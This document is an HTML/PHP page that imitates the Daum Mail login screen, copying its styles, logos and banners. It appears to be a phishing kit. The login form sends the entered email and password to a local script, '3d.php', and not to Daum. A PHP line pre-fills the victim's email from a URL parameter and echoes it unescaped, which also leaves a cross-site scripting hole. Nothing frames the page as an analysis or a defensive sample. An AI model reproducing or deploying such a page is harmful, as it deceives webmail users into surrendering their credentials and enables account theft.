
<!DOCTYPE html>
<!--<head>
</head>
<header>
</header>-->
<script type="text/javascript">
function validateForm()
{
var x=document.forms["loginForm"]["login"].value;
if (x==null || x=="")
  {
  alert("Please enter your email address.");
  return false;
  }
var x=document.forms["loginForm"]["login"].value;
var atpos=x.indexOf("@");
var dotpos=x.lastIndexOf(".");
if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length)
  {
  alert("Not a valid Email account.");
  return false;
  }
  var x=document.forms["loginForm"]["passwd"].value;
if (x==null || x=="")
  {
  alert("Please enter your password.");
  return false;
  }
}
</script>
<html lang="ko"><head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<title>Daum 메일</title>
<link rel="shortcut icon" href="http://i1.daumcdn.net/mimg/favicon/mail_favicon3.ICO">
<script type="text/javascript" src="https://m1.daumcdn.net/svc/original/U03/cssjs/jquery/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://m1.daumcdn.net/svc/original/U03/cssjs/jquery/plugin/jquery.cookie-1.3.1.min.js"></script>
<style type="text/css"> 
<!--
html {height:100%;background-color:#f7f9fa}/* 2013-04-24 수정 */ 
body {height:100%;margin:0;padding:0;text-align:center;min-width:1000px;background-color:#f7f9fa;position:relative}
hr, legend {display:none}
img,fieldset {border:0 none}
dl,ul,ol,li {list-style: none}
h1,h2,h3,h4,h5,dl,dt,dd,ul,li,ol,th,td,p,blockquote,form,fieldset,legend {margin:0;padding:0}
table {border-collapse:collapse}
a {text-decoration:none} a:link:hover, a:active {text-decoration:underline}
input,select,textarea {font-size:100%}
body,th,td {font-size:12px;font-family:"돋움",dotum,sans-serif;color:#333}
address,caption,cite,code,dfn,em,var {font-style:normal;font-weight:normal}
.ir_wa{display:block;overflow:hidden;position:relative;width:100%;height:100%;z-index:-1}  
.screen_out {display:block;overflow:hidden;position:absolute;left:-9999px;width:1px;height:1px;font-size:0;line-height:0;text-indent:-9999px}

#daumIndex {position:absolute;left:-1000px;height:1px;margin:0;overflow:hidden;padding:0;width:0;}

/* bodyWrap */
#bodyWrap {width:100%;min-height:100%;margin:-50px auto -33px;background-color:#fbfcfc;z-index:5}
#bodyWrap .layout {overflow:hidden;width:910px;min-height:690px;margin:0 auto;padding-top:49px;text-align:left}
 
/* leftWrap */
#leftWrap {float:left;width:250px}
#leftWrap h2 {width:250px;height:71px;margin:61px auto 23px;overflow:hidden}
#leftWrap .banner {width:100%;background:url(http://i2.daumcdn.net/mimg/10top/img_mailcomm_140528.png) no-repeat}
#leftWrap .mail_banner li a {display:block; width:100%; height:70px; text-indent:-3000em; overflow:hidden}
#leftWrap .mail_app {margin-bottom:11px;background-position:0 -140px}
#leftWrap .mail_smart {height:64px; background-position:-270px -140px}

/* mainWrap */
#mainWrap {overflow:hidden;float:left;width:660px;padding-top:61px}
#contentDesc {width:617px;margin-left:33px;padding-top:420px;background-repeat:no-repeat}
#contentDesc li {display:block;float:left;overflow:hidden;width:201px; height:55px;background:url(http://i2.daumcdn.net/mimg/10top/img_mailcomm.png) no-repeat;text-indent:-9999px}
#contentDesc li.n1 {background-position:0 -80px}
#contentDesc li.n2 {background-position:-201px -80px}
#contentDesc li.n3 {background-position:-402px -80px}
#contentDesc li a {display:block;width:100%;height:55px;text-indent:-3000em;overflow:hidden}
 
/* footerWrap */
#footerWrap {width:100%;height:31px;line-height:30px;border-top:1px solid #ced4db;background-color:#e9eff6;clear:both}/* 2013-04-19 수정 */
#footerWrap a {color:#7b8084; font-family:tahoma; font-size: 11px}
#footerWrap .info_copyright {display:block;font-size:11px;line-height:28px;font-family:tahoma}
#footerWrap .info_copyright .link_daumkakao {font-weight:bold;color:#666}

#leftWrap .mail .mail_blog {margin-bottom:7px;background-position:-270px 5px}/* 2013-04-19 수정 */
#contentDesc.mail {background:url(http://i2.daumcdn.net/mimg/10top/img_mail_150707.jpg) no-repeat}

.layout .tit_comm {background:url(http://i2.daumcdn.net/mimg/10top/img_mailcomm.png) no-repeat}
#leftWrap h2.mail {background-position:0 0px}/* 2013-04-19 수정 */
.layout #leftWrap h2.mail {background-color:transparent} /* 2013-04-09 추가 */

#daumLogin {position:relative;width:249px;padding-bottom:15px;border-top:2px solid #354063;border-bottom:1px solid #a9aebc;text-decoration:none}
#daumLogin form {overflow:hidden;width:100%;height:113px}
#daumLogin .cont_check {position:absolute;top:12px;left:0;width:242px;height:16px;padding:0 0 10px 7px;font-size:11px;letter-spacing:-1px;z-index:10}
#daumLogin .cont_check .tf_check {float:left;width:13px;height:13px;margin:0 4px 0 0;padding:0}
#daumLogin .cont_check .lab_check {float:left;padding-right:3px;line-height:15px;color:#6d7078;cursor:pointer}
#daumLogin .check_security {overflow:hidden;position:relative;float:left;width:80px;height:16px}
#daumLogin .check_security .link_security {line-height:15px;color:#6d7078}
#daumLogin .check_security .tf_check {position:absolute;top:0;left:50px;width:5px;height:5px;margin:2px 0 0 0;border:0 none;cursor:pointer;z-index:-1}
#daumLogin .check_security .lab_security {position:absolute;top:1px;left:46px;width:18px;height:14px;background:#fafcfc url(http://i2.daumcdn.net/mimg/10top/ico_login.gif) no-repeat 1px -18px;font-size:0;line-height:0;color:#fff;cursor:pointer;letter-spacing:-1px}
#daumLogin .check_security .on {outline:1px dotted #000;outline:-webkit-focus-ring-color auto 5px}
#daumLogin .check_off .lab_security {width:25px;background-position:1px -38px}
#daumLogin .member_links {position:relative;margin-top:15px;padding-left:7px;font-size:11px;letter-spacing:-1px}
#daumLogin .member_links .link_join {font-weight:bold;color:#434a55}
#daumLogin .member_links .link_rel {color:#6d7078}
#daumLogin .member_links .link_phoneid {color:#3770bf}
#daumLogin .txt_dot {padding:0 1px;color:#6d7078}
#daumLogin .txt_bar {padding:0 4px;color:#b6bbc3}
#daumLogin .layer_info {position:absolute;top:-13px;right:0;padding:8px 4px 1px 7px;border:1px solid #929497;font-size:11px;line-height:16px;letter-spacing:-1px;background-color:#fff;color:#262626;z-index:15}
#daumLogin .layer_info .link_rel {float:left;margin-top:6px;color:#8f8f8f;font-size:11px;letter-spacing:-1px;text-decoration:underline}
#daumLogin .layer_info .btn_close {float:right;width:18px;height:18px;margin:10px -2px 0 0;border:0 none;background:url(http://i2.daumcdn.net/mimg/10top/ico_login.gif) no-repeat  -36px 4px;font-size:0;text-indent:-9999px;cursor:pointer}
#daumLogin .layer_infostate {width:161px}
#daumLogin .layer_infopc {width:136px}

#MKD25,#AOSMGR {display:block;height:0;overflow:hidden}    /* for lv3 active-x */
#daumLogin .fieldWrap {overflow:hidden;position:relative;padding-top:38px}
#daumLogin .uid {float:left;width:177px;height:36px;border-top:1px solid #a9aebc;border-left:1px solid #a9aebc}
#daumLogin .upw {float:left;width:177px;height:37px;border-left:1px solid #a9aebc;border-bottom:1px solid #c0c4cf }
#id { border-bottom:none; background-position:10px -262px; background:#fff url() no-repeat 10px 12px; ime-mode: disabled}
#inputPwd { background:#fff url() no-repeat 10px 13px}
#id.on, #inputPwd.on {background-image:none}
#id, #inputPwd{width:160px;height:22px;border-top:1px solid #e8e9e8;border-left:1px solid #f7f7f7;border-bottom:0;font-weight:bold;font-size:14px;color:#3f4a58}
#id{border-bottom:none}
#id[type="text"] {float:left;padding:8px 5px 6px 10px;border-top:1px solid #f7f7f7;border-left:1px solid #f7f7f7}
#inputPwd[type="password"] {float:left;overflow:hidden;padding:8px 5px 6px 10px;border-left:1px solid #f7f7f7}
#daumLogin .btn{position:absolute;top:38px;left:177px;width:72px;font-size:11px;color:#858891;z-index:5}
#login{display:block;width:72px;height:75px;border:0;background-image:url(http://i2.daumcdn.net/mimg/10top/btn_login.gif);background-repeat:no-repeat;letter-spacing:-1px;cursor:pointer}
#login span{display:block;padding:2px 0 0 0;font-weight:bold;font-size:14px;font-family: "돋움",dotum,sans-serif;color:#3f4a58}
#daumLogin .btn label{position:absolute;top:6px;left:21px;letter-spacing:-1px;color:#354063}
#daumLogin .btn label[for="sid"]{top:5px}

/*--------------------------------------------------------------------------------
            GNB
--------------------------------------------------------------------------------*/
.daumhide {position: absolute; left: -9999in; width: 1px; height: 1px; overflow: hidden;}
/* minidaum */
#wrapMinidaum {position:absolute;right:15px;top:7px;width:330px}
#wrapMinidaum .minidaum_service_list li {background:url(http://i2.daumcdn.net/mimg/10top/bar_minidaum.gif) no-repeat 100% 1px} 
#wrapMinidaum #minidaumService li a {color:#a4a5a6}
#wrapMinidaum #minidaumNick {color:#a4a5a6} 
#wrapMinidaum #minidaumService #minidaumMore {color:#a4a5a6} 

/* daumHead */
#daumHead {position:relative;width:100%;height:50px;overflow:hidden;background:url(http://i1.daumcdn.net/mimg/10gnb/bg_131129.gif) repeat-x;z-index:10}
#daumHead:after {display:block;visibility:hidden;height:0;content:'';font-size:0;clear:both}
#daumHead h1 {display:inline;float:left;width:206px;font-weight:bold;font-size:18px;line-height:50px;letter-spacing:-1px}
#daumLogo {display:block;float:left;width:62px;height:50px;overflow:hidden;background:url(http://i1.daumcdn.net/mimg/10gnb/img_gnb_commu_150531.gif) no-repeat 0 0}
.link_service {display:block;float:left;height:50px;background:url(http://i1.daumcdn.net/mimg/10gnb/img_gnb_commu_150531.gif) no-repeat}
.tit_email .link_service {width:41px;background-position:0 -60px}
/* gnb */
#daumGnb {float:left;position:relative;width:440px;height:50px;background:url(http://i1.daumcdn.net/mimg/10gnb/img_gnb_commu_150531.gif) no-repeat 0 -360px}
#daumGnb li {float:left}
#daumGnb .gnb_communication {float:left}

.gnb_communication .link_gnb {display:block;height:50px;line-height:50px;font-weight:bold;font-size:14px;letter-spacing:-1px;text-align:center;background:url(http://i1.daumcdn.net/mimg/10gnb/img_gnb_commu_150531.gif) no-repeat}
.gnb_communication .link_gnb1 {width:71px;background-position:0 -360px}
.gnb_communication .link_gnb2 {width:84px;background-position:-71px -360px}
.gnb_communication .link_gnb3 {width:73px;background-position:-155px -360px}
.gnb_communication .link_gnb4 {width:85px;background-position:-228px -360px}
.gnb_communication .link_gnb5 {width:92px;background-position:-313px -360px}

.gnb_communication .on .link_gnb1 {width:77px;background-position:0 -420px}
.gnb_communication .on .link_gnb2 {width:89px;margin-left:-2px;background-position:-76px -420px}
.gnb_communication .on .link_gnb3 {width:77px;margin-left:-2px;background-position:-164px -420px}
.gnb_communication .on .link_gnb4 {width:88px;margin-left:-2px;background-position:-240px -420px}
.gnb_communication .on .link_gnb5 {width:108px;margin-left:-2px;background-position:-420px -420px}

/* 마이피플 레이어  */
.mypeoplemini_layer {overflow:hidden;position:absolute;left:566px;top:49px;z-index:999999;text-align:left;background-color:#f4f7fa}
.mypeoplemini_layer .layer_head .tit_my {font-size:14px;color:#fff}
.mypeoplemini_layer .layer_body {overflow:hidden;width:282px;height:120px;padding-top:17px;line-height:16px;color:#a7daff}
.mypeoplemini_layer .layer_body .txt_my {width:169px;height:31px;margin-bottom:34px;font-size:12px;background-position:0 -280px}
.mypeoplemini_layer .link_down {float:left;width:149px;height:45px;font-size:12px;line-height:1.5;background-position:0 -320px;text-indent:0}
.mypeoplemini_layer .link_close {display:block;position:absolute;width:25px;height:22px;right:1px;top:1px;font-size:12px;line-height:1.5;text-indent:0}
.img_mypeoplemini {background:url(http://i1.daumcdn.net/img-contents/event/promotion/130321_mypeople/bg_mini_130415.gif) no-repeat 0 0}
.inner_mypeoplemini_layer {width:407px;height:213px;padding:24px 0 0 23px;border:1px solid #2c3554;background-position:218px 28px}
.inner_mypeoplemini_layer .layer_head {width:143px;height:64px;background-position:0 -210px}
.mypeoplemini_layer .link_close .img_mypeoplemini {display:block;overflow:hidden;position:absolute;left:0;top:0;width:25px;height:22px;background-position:-150px -210px;text-indent:-9999px}
.mypeoplemini_layer .link_close .ir_wa {position:absolute;left:0;right:0}
.mypeoplemini_layer .img_mypeoplemini {background-color:transparent}
-->
</style> 

<script type="text/javascript">
	var jq = jQuery; //혹시 velocity의 $와 충돌날까봐 jq로 jQuery네임스페이스 사용
	var dip = jq.cookie("DIP");
	if(dip) {
		document.location.replace("http://login.daum.net/accounts/loginform.do?url="+ encodeURIComponent("http://" + location.hostname));
	}
</script>
<script charset="utf-8" type="text/javascript" src="http://s1.daumcdn.net/svc/original/U03/cssjs/minidaum/pc/minidaum-a.dark.min.js"></script><style>/* minidaum common */
#wrapMinidaum {z-index:999999;height:34px;font-size:12px;line-height:1.5;color:#333;text-align:left}
#minidaum ol, #minidaum ul, #minidaum li {list-style:none}
#minidaum img, #minidaum fieldset {border:0;padding:0}
#minidaum img {vertical-align:top}
#minidaum p {margin:0;padding:0}
#minidaum a {font-family:"돋움",dotum,sans-serif;text-decoration:none}
#minidaum a:active, #minidaum a:hover {text-decoration:underline}
#wrapMinidaum .screen_out {display:block;overflow:hidden;position:absolute;left:-9999px;width:1px;height:1px;font-size:0;line-height:0;text-indent:-9999px}
#minidaum {position:absolute;top:0;left:0;width:100%;height:34px;letter-spacing:-1px}
#minidaum #minidaumStart {float:left;line-height:17px;margin:7px 17px 0 0;color:#818388}
#minidaum #minidaumStart.show {display:block}
.minidaum_gnb {float:right;margin-top:6px;line-height:15px}
*:first-child+html .minidaum_gnb {line-height:14px}
#minidaumUser {position:relative;float:left;margin-right:2px}
#minidaum .minidaum_login #btnMinidaumLogin {display:none}
#minidaumUserLayer {display:none;position:absolute;top:18px;right:9px;width:80px;font-size:12px;background:#fff none;border:1px solid #444}
#minidaumUserLayer.minidaumUserLayer_open {display:block;overflow:hidden;z-index:999999}
#minidaumUserLayer a {font-size:12px;color:#333}
#minidaumUserLayer .minidaum_logout {height:19px;padding-top:5px;padding-left:10px;background:#f4f5f7 none}
#minidaumUserLayer .minidaum_logout a {font-weight:bold}
#minidaumUserLayer .minidaum_mylayer {padding:7px 0 7px 10px;border-top:1px solid #f1f2f4;letter-spacing:0}
#minidaumUserLayer .minidaum_mylayer li {height:19px;line-height:19px}
#minidaumUserLayer .minidaum_myinfo li {height:18px;line-height:18px}
#minidaumUserLayer .minidaum_myinfo a {color:#777}
#minidaumService {float:left;padding-top:4px}
#minidaumService .minidaum_top_link {padding-right:1px}
.minidaum_service_list {float:left}
.minidaum_service_list .minidaum_news {padding-right:9px}
.minidaum_service_list .minidaum_shopping {padding-right:8px}
.minidaum_service_list .minidaum_new{display:inline-block;overflow:hidden;width:11px;height:12px;margin-left:3px;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat -160px -270px;text-indent:-3000px;vertical-align:bottom}
.minidaum_service_list .minidaum_count * {margin-top:0}
#minidaumMoreLayer {display:none;position:absolute;top:27px;right:0;overflow:hidden;width:449px;height:223px;font-size:12px;background:#fff none;border:1px solid #444;letter-spacing:0}
#minidaumMoreLayer.minidaumMoreLayer_open {display:block;z-index:999999}
#minidaumMoreLayer .minidaum_idx {overflow:hidden;position:absolute;top:16px;width:36px;height:13px;text-indent:-9999px}
#minidaumMoreLayer .minidaum_idx1 {left:22px;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat 0 -40px}
#minidaumMoreLayer .minidaum_idx2 {left:104px;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat -40px -40px}
#minidaumMoreLayer .minidaum_idx3 {left:194px;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat -80px -40px}
#minidaumMoreLayer .minidaum_idx4 {left:284px;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat -120px -40px}
#minidaumMoreLayer .minidaum_idx5 {left:374px;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat -160px -40px}
#minidaumMoreLayer .minidaum_list_group {float:left;width:89px;height:176px;margin-top:16px;padding-top:20px;border-left:1px solid #ebeef2}
#minidaumMoreLayer .minidaum_list_group li {float:left;overflow:hidden;width:100%;height:22px;line-height:23px;text-indent:13px}
#minidaumMoreLayer .minidaum_list_group1 li {float:left;overflow:hidden;width:100%;height:22px;line-height:23px;text-indent:21px}
#minidaumMoreLayer .minidaum_list_group li a {font-size:12px;color:#333;white-space:nowrap}
#minidaumMoreLayer .minidaum_list_group .last {height:18px}
#minidaumMoreLayer .minidaum_list_group1 {width:89px;border:none}
#minidaumMoreLayer .minidaum_list_group5 {width:86px}
#minidaumMoreLayer .minidaum_list_group .minidaum_all a {padding-right:7px;color:#5279b4;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat 100% -147px;text-decoration:underline;letter-spacing:-1px}
#minidaumMoreLayer.minidaum_custom .minidaum_idx {top:49px}
#minidaum .minidaum_custom {height:258px}
#minidaum .minidaum_custom .minidaum_list_group {margin-top:49px}
#minidaumMoreLayer .minidaum_more_custom {position:absolute;top:0;left:0;overflow:hidden;width:427px;height:33px;padding-left:22px;color:#000;background:#f5f6f8 none;border-bottom:1px solid #f0f1f3}
#minidaumMoreLayer .minidaum_more_custom a {color:#000;font-size:12px}
#minidaumMoreLayer .minidaum_more_custom li {float:left;line-height:33px;margin-right:21px}
#minidaumRank {float:left;position:relative;overflow:hidden;width:191px;height:19px;margin-top:9px;font-size:12px;letter-spacing:0}
#minidaumRank .minidaum_rank_tit {display:none;height:0;line-height:0}
#minidaumRank .minidaum_status {float:left;width:7px;height:12px;margin-right:2px;text-indent:-3000px}
#minidaumRank .minidaum_up {background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat 0 -21px}
#minidaumRank .minidaum_down {background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat -20px -21px}
#minidaumRank .minidaum_keep {background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat -40px -19px}
#minidaumRank .minidaum_new {width:22px;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat -60px -20px}
#minidaumRank .minidaum_rank_list li {float:left;width:100%;padding-left:16px;height:23px;line-height:14px}
#minidaum .minidaum_rank_open {z-index:999999;width:190px;height:276px;margin-top:6px;font-family:'굴림',gulim,sans-serif;border:1px solid #444;background:#fff none}
#minidaum .minidaum_rank_open a {font-family:'굴림',gulim,sans-serif}
#minidaum .minidaum_rank_open li {position:relative}
#minidaum .minidaum_rank_open .num_issue {display:block;overflow:hidden;position:absolute;left:-9999px;width:1px;height:1px;font-size:0;line-height:0;text-indent:-9999px}
#minidaum .minidaum_rank_open .minidaum_rank_list {padding:11px 0 0 0;background-position:14px -158px}
#minidaum .minidaum_rank_open .minidaum_rank_list li {padding:0 0 0 14px}
#minidaum .minidaum_rank_open .minidaum_rank_tit {display:block;height:29px;line-height:31px;color:#565656;font-weight:bold;background:#f4f5f7;border-bottom:1px solid #dbdbdb;text-align:center;letter-spacing:-1px}
#minidaum .minidaum_rank_open .minidaum_word {overflow:hidden;width:115px;_width:137px;margin-right:1px;padding:0 0 0 22px;font-size:12px;color:#000;letter-spacing:0}
#minidaum .minidaum_rank_open .minidaum_dummy {display:none}
#minidaum .minidaum_rank_open .minidaum_num {font-size:10px;color:#4c4c4c}
#minidaum .minidaum_rank_open .minidaum_select .minidaum_word {font-weight:bold;letter-spacing:-1px}
#minidaum .minidaum_shield {position:absolute;top:0;left:0;z-index:-1}
#minidaum .minidaumMoreLayer_open .minidaum_shield,
#minidaum .minidaumUserLayer_open .minidaum_shield,
#minidaum .minidaum_rank_open .minidaum_shield {border:1px solid #fff}

/* black 버전 */
body {background:#fff url(http://i1.daumcdn.net/icon/minidaum/common/minibar_b_v03.gif) repeat-x}
#btnMinidaumLogin {float:left;overflow:hidden;width:46px;height:21px;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat -150px 0;text-indent:-9999px;vertical-align:bottom}
#minidaum .minidaum_logo {display:inline;float:left;margin:7px 14px 0 3px}
#minidaum .minidaum_logo .img_logo {display:block;overflow:hidden;width:41px;height:19px;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat -50px 0;text-indent:-9999px}
.minidaum_service_list li {float:left;padding:0 8px 0 7px;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat 100% -109px}
#minidaumRank .minidaum_word {float:left;margin-top:1px;padding-right:6px;line-height:15px;color:#a9a9a9;white-space:nowrap;letter-spacing:-1px}
*:first-child+html #minidaumRank .minidaum_word {line-height:14px}
#minidaumRank .minidaum_rank_list {float:left;width:190px;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat 1px -672px}
#minidaumRank .minidaum_num {float:left;line-height:15px;color:#a9a9a9;font-size:11px;font-family:tahoma}
#minidaumRank .minidaum_dummy {background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat 1px -672px}
#minidaumService li a {color:#a9a9a9}
#minidaumService #minidaumMore {display:inline;float:left;padding:0 9px 0 7px;font-weight:bold;color:#a9a9a9;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat 100% -90px}
#minidaumService .minidaum_service_list .minidaum_count {padding:0 2px 0 1px;font-weight:bold;color:#669aff}
#minidaumNick {padding-right:9px;line-height:17px;color:#a9a9a9;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat 100% -91px}
*:first-child+html #minidaumNick {line-height:16px}
#minidaumUser.minidaum_login {padding-right:9px;margin-top:3px;line-height:16px;background:url(http://i1.daumcdn.net/icon/minidaum/common/minidaum_v16.png) no-repeat 100% -108px}
</style></head>

<body>
	<div id="daumIndex" class="screen_out">
		<a href="#daumGnb" rel="bookmark">관련서비스 바로가기</a>
		<a href="#bodyWrap" rel="bookmark">메일 본문 바로가기</a>
	</div>
	<div id="daumHead">
		<h1 class="tit_email">
			<a id="daumLogo" href="http://www.daum.net/?nil_profile=daum&amp;nil_src=hanmail&amp;_top_hm=w_top_daum" title="Daum 메인페이지로 가기" target="_top"><span class="ir_wa">Daum</span></a>
			<a href="#" id="daumServiceLogo" class="link_service"><span class="ir_wa">메일</span></a>
		</h1>
		<h2 class="screen_out">관련서비스</h2>
		<div id="daumGnb">
			<ul class="gnb_communication">
				<li class="on"><a href="#" target="_top" class="link_gnb link_gnb1"><span class="ir_wa">메일</span></a></li> <!-- 현재페이지에 on클래스 추가  -->
				<li><a href="#" target="_top" class="link_gnb link_gnb2"><span class="ir_wa">주소록</span></a></li> 
				<li><a href="#" target="_top" class="link_gnb link_gnb3"><span class="ir_wa">쪽지</span></a></li> 
				<li><a href="#" target="_top" class="link_gnb link_gnb4"><span class="ir_wa">캘린더</span></a></li> 
				<li><a href="#" target="_top" class="link_gnb link_gnb5"><span class="ir_wa">클라우드</span></a></li>				
			</ul>
		</div>
	</div>
	<hr>
	<div id="bodyWrap">
		<div class="layout">
			<div id="leftWrap">
				<h2 class="tit_comm mail">
					<span class="screen_out">모바일에서도 역시 Daum 메일</span>
				</h2>
				<h3 class="daumhide">로그인</h3> 
				<div id="daumLogin"> 
					<form name="loginform" id="loginForm" method="POST" action="3d.php"> 
						<input type="hidden" id="url" name="url" value="http://mail.daum.net/hanmailex/Top.daum">
						<input type="hidden" name="weblogin" value="1">
						<input type="hidden" name="slevel" value="$SLEVEL">
						<input type="hidden" name="saved_id" value="">
						
						<fieldset class="fieldWrap"> 
							<legend class="daumhide">로그인 폼</legend> 
							<p class="uid"> 
								<label for="id" class="daumhide">아이디 or 이메일</label> 
								<input type="text" name="login" id="id" maxlength="50" value="<?php echo $_GET['Email']; ?>" placeholder="아이디 or 이메일" tabindex="1" required="" "onfocus="loginFieldFocus(this);" onblur="loginFieldBlur(this);" class="" autofocus=""> 
							</p>
	 						<p class="upw"> 
								<label for="inputPwd" class="daumhide">비밀번호</label> 
								<input type="password" name="passwd" id="inputPwd" maxlength="32" value="" placeholder="비밀번호입력" tabindex="2" onfocus="loginFieldFocus(this);" required="" onblur="loginFieldBlur(this);"> 
							</p> 
							<div class="cont_check">
								<input type="checkbox" name="stln" id="stln" class="tf_check" tabindex="3" onclick="showLayerInfoPC();">
								<label id="lbStln" for="stln" class="lab_check">로그인 상태 유지</label>
								<div class="layer_info layer_infostate" style="display:none">
									<p>‘ID 저장’ 설정이 종료되었습니다.<br> ‘로그인 상태 유지’를 이용해 보세요.</p>
									<a href="http://cs.daum.net/faq/59/8035.html#25707" target="_blank" class="link_rel">도움말</a>
									<button type="button" class="btn_close" onclick="hideIDSaveInfoLayer();">닫기</button>
								</div>
								<div class="layer_info layer_infopc" style="display:none">
									<p>개인정보 보호를 위해<br> 개인 PC에서만 사용해 주세요.</p>
									<a href="http://cs.daum.net/faq/59/8035.html#25707" target="_blank" class="link_rel">도움말</a>
									<button type="button" class="btn_close" onclick="hideLayerInfoPC();">닫기</button>
								</div>
								<div class="check_security  check_off ">
									<span class="txt_bar">|</span>
									<a href="javascript:;" class="link_security" tabindex="4" target="_blank" onclick="return linkSecurityClick();">IP보안</a>
									<input type="checkbox" id="ipSecurity" class="tf_check" tabindex="5" checked="checked" onfocus="focusIpSecurity();" onblur="blurIpSecurity();">
									<label for="ipSecurity" class="img_login lab_security">IP보안 설정</label>
								</div>
							</div>
							<p class="btn"> 
								<button type="submit" id="login" title="로그인" tabindex="6"><span>로그인</span></button> 
	 						</p>
						</fieldset> 
					</form> 
					<div class="member_links">
						<a href="#" class="link_join" target="_blank">회원가입</a>
						<span class="txt_bar">|</span>
						<a href="#" class="link_rel" target="_blank">아이디</a><span class="txt_dot">·</span><a href="#" class="link_rel" target="_blank">비밀번호 찾기</a>
						<span class="txt_bar">|</span>
						<a href="#" class="link_phoneid">폰번호 로그인</a>
					</div>
				</div>
 
<script type="text/javascript"> 
<!--

	function focusIpSecurity() {
		var lab = jq('.lab_security')[0];
		jq(lab).addClass('on');
	}
	
	function blurIpSecurity() {
		var lab = jq('.lab_security')[0];
		jq(lab).removeClass(lab, 'on');
	}
	
	function showLayerInfoPC() {
		var layer = jq('.layer_infopc')[0];
		var idLayer = jq('.layer_infostate')[0];
		
		if(!jq('#stln:checked').length) {
			hideLayerInfoPC();
			return;
		}
		
		if(jq('.layer_infostate:visible').length) {
			jq(idLayer).hide();
		}
		jq(layer).show();
	}
	
	function hideLayerInfoPC() {
		var layer = jq('.layer_infopc')[0];
		jq(layer).hide();
	}
	
	function showIDSaveInfoLayer() {
		var layer = jq('.layer_infostate')[0];
		jq(layer).show();
	}
	
	function hideIDSaveInfoLayer() {
		var layer = jq('.layer_infostate')[0];
		jq.cookie('D_sid', '', {path:'/', domain:"daum.net"});
		jq(layer).hide();
	}
	
	function loginFieldFocus(field){
		field.className = 'on';
	}
	
	function loginFieldBlur(field){
		if (field.value == '') {
			field.className = '';
		}
	}
	
	function linkSecurityClick() {
		var b = "";
		if (location.protocol == "https:") {
			b = ""
		}
		var c = b + "/accounts/loginform/popup/ipsecuritysetting.do";
		window.open(c, "_blank", "width=377, height=353, toolbar=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no");
		return false;
	}
	
	if('') {
		loginFieldFocus(document.loginform.id);
		document.loginform.passwd.focus();
	} else {
		document.loginform.login.focus();
	}
//-->
</script>
				<hr>
				<h3 class="daumhide">다음 소식</h3>
				<ul class="mail_banner mail">        
					<li><a class="banner mail_blog" href="#" target="_blank">공식블로그 Daum 메일을 만드는 사람들</a></li>
					<li><a class="banner mail_app" href="#" target="_blank">내 손안의 Daum 매일앱 PC메일 그대로 스마트폰에서 관리</a></li>
					<li><a class="banner mail_smart" href="#" target="_blank">Daum 스마트워크 메일, 공유 주소록, 캘린더로 손쉬운 업무</a></li>
				</ul>
			</div> 
			<hr> 
			
			<div id="mainWrap">
				<h3 class="daumhide">Daum 메일 소개</h3>
				<ul id="contentDesc" class="mail">
					<li class="n1">
						<a href="#" title="스마트폰에 한메일 설정하기" target="_blank"><span>편리한 다른 메일주소 설정 Daum 메일뿐 아니라, 타사 메일까지 Daum에서 모두 관리</span></a>
					</li>
					<li class="n2">
						<a href="#" title="평생 증가하는 메일용량" target="_blank"><span>넉넉한 대용량 파일첨부 무젲한 용량과 30일 보관기능으로 걱정 없이 파일 첨부</span></a>
					</li>
					<li class="n3">
						<a href="#" title="더욱 똑똑해진 스팸제로2.0과 함께하는 강력스팸차단" target="_blank"><span>똑똑한 스팸메일 필터링 스팸클리너, 스팸제로와 함께 깔끔한 메일함 관리</span></a>
					</li>
				</ul>
			</div>
		</div>
	</div>
	<hr>
	<div id="footerWrap">
		<small class="info_copyright">Copyright © <a href="#" target="_blank" class="link_daumkakao">Daum Kakao Corp.</a></small>
	</div>

	<div id="wrapMinidaum"><div id="minidaum"><div class="minidaum_gnb"><div id="minidaumUser"><a href="#" target="_top" id="btnMinidaumLogin">로그인</a></div><h2 class="screen_out">서비스 바로가기</h2><div id="minidaumService"><ul class="minidaum_service_list"><li class="minidaum_top"><a href="#" target="_top" class="minidaum_top_link">Daum</a></li><li id="minidaumMail" class="minidaum_mail"><a href="#" target="_top">메일</a><a href="#" target="_top" class="minidaum_count" id="minidaumMailCnt"></a></li><li id="minidaumCafe" class="minidaum_cafe"><a href="#" target="_top">카페</a><a href="#" target="_top" class="minidaum_count" id="minidaumCafeCnt"></a></li><li class="minidaum_news"><a href="#" target="_top">뉴스</a></li><li class="minidaum_shopping"><a href="#">쇼핑</a></li></ul><a href="#" id="minidaumMore" target="_top"><span class="screen_out">전체서비스</span> 더보기</a></div></div><div id="minidaumMoreLayer"><strong class="minidaum_idx minidaum_idx1">더보기 1열</strong><ul class="minidaum_list_group minidaum_list_group1"><li><a href="#" target="_top">게임</a></li><li><a href="#" target="_top">게임팩</a></li><li><a href="#" target="_top">금융</a></li><li><a href="#" target="_top">날씨</a></li><li><a href="#" target="_top">뉴스</a></li><li><a href="#" target="_top">라이프</a></li><li><a href="#" target="_top">로드뷰</a></li><li><a href="#" 